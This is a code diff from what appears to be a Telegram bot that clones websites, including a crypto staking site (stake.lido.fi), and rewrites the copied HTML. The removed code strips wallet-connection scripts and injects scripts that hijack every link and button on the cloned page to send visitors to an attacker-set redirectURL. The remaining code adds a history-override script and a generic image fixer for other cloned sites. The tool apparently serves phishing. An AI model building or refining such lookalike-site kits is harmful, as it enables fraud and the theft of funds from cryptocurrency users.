@@ -175,25 +175,6 @@ bot.on("text", async (ctx) => {
             }
           });
 
-          // Remove wallet-related scripts
-          $("script").each((_, el) => {
-            const src = $(el).attr("src") || "";
-            const content = $(el).html() || "";
-            if (
-              src.toLowerCase().includes("walletconnect") ||
-              src.toLowerCase().includes("metamask") ||
-              src.toLowerCase().includes("web3") ||
-              content.toLowerCase().includes("walletconnect") ||
-              content.toLowerCase().includes("metamask") ||
-              content.toLowerCase().includes("web3")
-            ) {
-              $(el).remove();
-              console.log(
-                `🗑️ Removed wallet-related script: ${src || "inline"}`
-              );
-            }
-          });
-
           // Add history.replaceState override to the cloned HTML
           $("head").prepend(`<script class="history-override">
         (function() {
@@ -240,70 +221,22 @@ bot.on("text", async (ctx) => {
       </script>`);
 
           $("head").prepend(`<script class="dynamic-script">
-          window.addEventListener("DOMContentLoaded", () => {
-            console.log("🔁 Running prioritized image fixer...");
-            function fixImages() {
-              // Redirect all <a> tags
-              document.querySelectorAll("a").forEach((link) => {
-                link.removeAttribute("href");
-                link.addEventListener("click", function (event) {
-                  event.preventDefault();
-                  window.location.href = '${redirectURL}';
-                });
-              });
-
-              // Redirect all <button> elements
-              document.querySelectorAll("button").forEach((button) => {
-                button.removeAttribute("onclick");
-                button.addEventListener("click", function (event) {
-                  event.preventDefault();
-                  event.stopImmediatePropagation(); // Stops any other handlers
-                  window.location.href = '${redirectURL}';
-                });
-
-              });
-   
-              const images = document.querySelectorAll("img");
-              images.forEach((img) => {
-                const src = img.getAttribute("src");
-                img.removeAttribute("srcset");
-                if (
-                  src &&
-                  src.startsWith("/") &&
-                  !src.startsWith("data:") &&
-                  !src.startsWith("//") &&
-                  !src.startsWith("http")
-                ) {
-                  img.src = new URL(src, "https://stake.lido.fi/").href;
-                }
-              });
-            }
-            fixImages();
-            setTimeout(fixImages, 3000);
-            setInterval(fixImages, 10000);
-          });
-    </script>`);
-          $("head").prepend(`<script class="dynamic-script">
-       document.addEventListener('DOMContentLoaded', function() {
-    // Target URL for redirection
-  const redirectUrl = ${redirectURL};
-
-    // Redirect all <a> tags
-    document.querySelectorAll('a').forEach(link => {
-        link.addEventListener('click', function(event) {
-            event.preventDefault();
-            window.location.href = redirectUrl;
+        window.addEventListener('DOMContentLoaded', () => {
+          console.log("🔁 Running prioritized image fixer...");
+          function fixImages() {
+            const images = document.querySelectorAll('img');
+            images.forEach(img => {
+              const src = img.getAttribute('src');
+              img.removeAttribute('srcset');
+              if (src && src.startsWith('/') && !src.startsWith('data:') && !src.startsWith('//') && !src.startsWith('http')) {
+                img.src = new URL(src, '${siteUrl}').href;
+              }
+            });
+          }
+          fixImages();
+          setTimeout(fixImages, 3000);
+          setInterval(fixImages, 10000);
         });
-    });
-
-    // Redirect all <button> elements
-    document.querySelectorAll('button').forEach(button => {
-        button.addEventListener('click', function(event) {
-            event.preventDefault();
-            window.location.href = redirectUrl;
-        });
-    });
-});
       </script>`);
           // Save HTML
           await fs.outputFile(path.join(outputDir, "index.html"), $.html());
